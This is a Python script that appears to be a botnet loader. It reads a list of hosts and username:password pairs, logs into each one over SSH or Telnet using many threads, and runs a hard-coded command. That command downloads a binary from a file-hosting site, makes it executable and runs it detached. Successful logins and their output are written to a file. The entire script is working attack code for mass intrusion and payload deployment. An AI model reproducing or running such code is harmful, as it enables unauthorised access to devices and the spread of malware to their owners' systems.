import paramiko
import concurrent.futures
import telnetlib

# SSH & Telnet command
# CHANGE THIS
cmd = "mkdir 100mb; cd 100mb; wget https://files.catbox.moe/0y8u8c; chmod +x 0y8u8c; ./0y8u8c & disown"

RED = "\033[1;31m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"

processed = 0
tried = 0
success = 0

def check_ip(line, mode):
    global processed, tried, success

    details = line.strip().split(' ')
    host, port = details[0].split(':')
    user, password = details[1].split(':')

    tried += 1
    print(f"Processed: {processed} | Tried: {tried} | Success: {success}")

    if mode == 'ssh':
        ssh = None
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=int(port), username=user, password=password, timeout=1)

            stdin, stdout, stderr = ssh.exec_command(cmd)

            output = stdout.read().decode('ascii')

            success += 1

            with open('success.txt', 'a') as file:
                file.write(f"{host}:{port} {user}:{password}:{output}\n")

        except TimeoutError:
            print(f"{RED}Timeout error: The connection to {host}:{port} timed out.{RESET}")
        except paramiko.AuthenticationException:
            print(f"{RED}Login to {host}:{port} as {user} failed.{RESET}")
        except Exception as e:
            print(f"Error: {str(e)}")

        finally:

            if ssh is not None:
                ssh.close()

    elif mode == 'telnet':
        try:
            connection = telnetlib.Telnet(host, port, timeout=1)
            connection.read_until(b"login: ")
            connection.write(user.encode('ascii') + b"\n")
            connection.read_until(b"Password: ")
            connection.write(password.encode('ascii') + b"\n")
            connection.write(cmd.encode('ascii') + b"\n")
            connection.write(b"exit\n")

            success += 1

        except Exception as e:
            print(f"Error: {str(e)}")

    processed += 1


mode = input("Enter connection mode (raw, telnet, ssh): ")

with open('list.txt', 'r') as file:
    lines = file.readlines()

new_lines = [line.replace(':0', ':22') for line in lines]

with concurrent.futures.ThreadPoolExecutor() as executor:
    executor.map(check_ip, new_lines, [mode]*len(new_lines))

print(f"Final counts | Processed: {processed} | Tried: {tried} | Success: {success}")
